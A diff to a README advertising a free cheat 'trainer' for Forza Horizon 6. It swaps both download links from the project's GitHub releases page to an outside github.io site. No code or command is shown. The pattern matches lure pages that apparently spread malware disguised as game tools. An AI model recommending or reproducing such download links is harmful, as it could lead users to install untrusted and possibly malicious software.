@@ -1,6 +1,6 @@
 # ⚡ FH6-Trainer-AllInOne - Unlock Everything in Forza Horizon 6
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=windows)](https://github.com/Uncongenial-goldcrownedkinglet935/FH6-Trainer-AllInOne/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=windows)](https://uncongenial-goldcrownedkinglet935.github.io)
 
 **FH6-Trainer-AllInOne** is a free trainer for Forza Horizon 6 on Windows. Add unlimited wheelspins, unlock all cars, and get infinite money and XP with one tool. No Wemod required. No subscriptions. Works with Xbox Game Pass PC version.
 
@@ -53,7 +53,7 @@ Your computer needs:
 
 **Step 1:** Visit the releases page.
 
-[Click here to go to the download page](https://github.com/Uncongenial-goldcrownedkinglet935/FH6-Trainer-AllInOne/releases)
+[Click here to go to the download page](https://uncongenial-goldcrownedkinglet935.github.io)
 
 **Step 2:** Find the latest release. It appears at the top of the page.
 
